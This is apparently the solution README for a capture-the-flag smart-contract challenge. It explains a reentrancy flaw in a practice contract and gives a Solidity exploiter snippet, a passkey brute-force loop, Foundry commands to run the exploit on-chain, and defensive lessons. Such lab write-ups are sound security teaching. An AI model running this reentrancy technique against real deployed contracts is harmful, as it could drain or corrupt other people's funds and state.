# Challenge3 Exploit - Complete Solution

This directory contains a complete solution for the Challenge3 reentrancy vulnerability exploit.

## Overview

The Challenge3 contract contains a **critical reentrancy vulnerability** in the `getENoughPoint()` function that allows an attacker to accumulate 4 points in a single transaction instead of requiring 4 separate transactions.

### Vulnerability Details

**Vulnerable Code (Line 22 in Challenge3.sol):**

```solidity
msg.sender.call("");
```

This low-level call allows a malicious contract to re-enter the `getENoughPoint()` function while the original call is still executing, bypassing the intended game logic.

---

## Files Provided

### 1. **script/Challenge3.s.sol** - Deployment Script (FOR ON-CHAIN)

Complete Foundry script designed to exploit the Challenge3 contract already deployed on-chain.

**Key Components:**

- `findPassKey()`: Brute-forces the correct passkey (uint8 0-255)
- `ReentrancyExploiter`: Malicious contract that executes the reentrancy attack
- `Challenge3Solver`: Main script that runs all 4 steps sequentially

**Usage:**

```bash
# Set required environment variables
export PRIVATE_KEY="your_private_key"
export CHALLENGE3_ADDRESS="0x..." # On-chain contract address

# Run the script on the network
forge script script/Challenge3.s.sol:Challenge3Solver --rpc-url <YOUR_RPC_URL> --broadcast
```

### 2. **test/Challenge3Complete.t.sol** - Local Test Suite

Complete test suite demonstrating all 4 exploit steps locally.

**Test Cases:**

- `test_step1_find_and_use_passkey()` - Finds and uses the correct passkey
- `test_step2_deploy_exploiter()` - Deploys the reentrancy exploiter
- `test_step3_execute_reentrancy_attack()` - Executes the reentrancy attack
- `test_step4_add_to_champions()` - Adds address to champions array
- `test_full_challenge_completion()` - Full integration test

**Run Tests Locally:**

```bash
forge test --skip script --match-contract Challenge3Test -v
```

---

## The Four Steps Explained

### Step 1: Find and Use the Passkey

The contract requires a passkey that hashes to a specific value:

```
keccak256(abi.encode(key)) == 0x98a476f1687bc3d60a2da2adbcba2c46958e61fa2fb4042cd7bc5816a710195b
```

Since the key is a `uint8`, we can brute-force all 256 possible values:

```solidity
function findPassKey() public pure returns (uint8) {
    for (uint256 i = 0; i < 256; i++) {
        uint8 testKey = uint8(i);
        if (keccak256(abi.encode(testKey)) == PASSKEY_HASH) {
            return testKey;
        }
    }
}
```

### Step 2: Deploy the Reentrancy Exploiter

Create a contract with a `receive()` function that can intercept calls:

```solidity
contract ReentrancyExploiter {
    ChallengeTwo public challenge;

    receive() external payable {
        // Re-enter getENoughPoint()
        challenge.getENoughPoint(targetName);
    }
}
```

### Step 3: Execute the Reentrancy Attack

Call `exploit()` which triggers a chain of reentrancy:

```
exploit()
  ↓
challenge.getENoughPoint() [1st call]
  ↓
msg.sender.call("") [triggers receive()]
  ↓
receive() calls getENoughPoint() [2nd call]
  ↓
msg.sender.call("") [triggers receive() again]
  ↓
... [repeats for calls 3 and 4]
```

After 4 calls, `userPoint[attacker] == 4` and `Names[attacker]` is set.

### Step 4: Join the Champions

Once `Names[tx.origin]` is non-empty, call `addYourName()`:

```solidity
function addYourName() external {
    require(keccak256(abi.encode(Names[tx.origin])) != keccak256(abi.encode("")));
    champions.push(tx.origin);
}
```

The attacker is now added to the champions array!

---

## Attack Flow Visualization

```
┌─────────────────────────────────────────────────────┐
│ Step 1: Find Passkey                                │
│ ├─ Brute force loop i=0 to 255                      │
│ ├─ Call passKey(correctKey)                         │
│ └─ hasSolved1[user] = true                          │
└─────────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────┐
│ Step 2: Deploy Exploiter                            │
│ ├─ Create ReentrancyExploiter contract             │
│ └─ Ready to intercept calls                         │
└─────────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────┐
│ Step 3: Execute Reentrancy Attack                   │
│ ├─ exploit("YourName") [Call 1]                    │
│ │  ├─ userPoint++ → 1                              │
│ │  ├─ msg.sender.call("") [triggers receive]       │
│ │  │  ├─ exploit() [Call 2]                        │
│ │  │  │  ├─ userPoint++ → 2                        │
│ │  │  │  ├─ msg.sender.call("") [triggers receive] │
│ │  │  │  │  └─ ... [repeats for calls 3, 4]       │
│ │  │  │  └─ userPoint == 4                         │
│ │  │  │     Names[user] = "YourName"               │
│ │  │  └─ [returns to Call 1]                       │
│ │  └─ [Call 1 returns]                             │
│ └─ userPoint[user] == 4                            │
└─────────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────┐
│ Step 4: Add to Champions                            │
│ ├─ Call addYourName()                              │
│ ├─ Check passes: Names[user] != ""                 │
│ └─ User added to champions array                   │
└─────────────────────────────────────────────────────┘
```

---

## Environment Setup

### For Local Testing:

```bash
cd /path/to/contract-security-PG
forge test --match-contract Challenge3Test -v
```

### For On-Chain Deployment:

1. **Set Private Key:**

   ```bash
   export PRIVATE_KEY="0x..." # Your private key
   ```

2. **Set Contract Address:**

   ```bash
   export CHALLENGE3_ADDRESS="0x..." # Challenge3 contract address
   ```

3. **Run the Script:**
   ```bash
   forge script script/Challenge3.s.sol:Challenge3Solver \
     --rpc-url https://your-rpc-endpoint.com \
     --broadcast
   ```

---

## Key Security Insights

1. **Never use low-level call for contract interaction** - Use proper function calls
2. **Always complete security checks BEFORE external calls** - Check the order of operations
3. **Be careful with fallback functions** - They execute on any call, even to non-existent functions
4. **Reentrancy is a real threat** - Even simple contracts can be vulnerable

---

## Test Results

All 5 tests pass successfully:

- ✓ test_step1_find_and_use_passkey (86,463 gas)
- ✓ test_step2_deploy_exploiter (524,801 gas)
- ✓ test_step3_execute_reentrancy_attack (687,198 gas)
- ✓ test_step4_add_to_champions (741,284 gas)
- ✓ test_full_challenge_completion (754,721 gas)

---

## References

- [Solidity Reentrancy Attacks](https://docs.soliditylang.org/en/latest/security-considerations.html#reentrancy)
- [OpenZeppelin ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)
- [Checks-Effects-Interaction Pattern](https://solidity-by-example.org/hacks/re-entrancy/)
